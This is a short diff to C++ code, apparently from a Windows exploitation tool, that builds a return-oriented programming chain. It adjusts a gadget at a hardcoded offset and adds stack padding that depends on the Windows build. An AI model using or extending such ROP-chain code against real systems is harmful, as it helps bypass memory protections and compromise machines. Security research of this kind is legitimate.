@@ -59,11 +59,12 @@ void StackManager::PivotToR11()
 
 void StackManager::MovRaxIntoR9()
 {
-    // IMPORTANT NOTE: On some windows builds this includes "add rsp, 0x28;" and on some not,
-    // this is why we account for it.
+    // On windows builds up until Win11 23h2 (including), this gadget includes "add rsp, 0x28;"
+    // on later versions it does not. This is why we add padding for some versions, and keep our
+    // regex query generic to find any variation of this gadget.
     // TODO: Check if the instruction exists, instead of hardcoding the winvers.
     this->AddGadget(0x2f3286, "mov r9, rax; mov rax, r9; (add rsp, 0x28; )?ret;");
-    if (Globals::WindowsBuild == "22H2" || Globals::WindowsBuild == "23H2")
+    if (Globals::WindowsBuild <= WINVER_WIN11_23H2)
         this->AddPadding(0x28);
 }
 
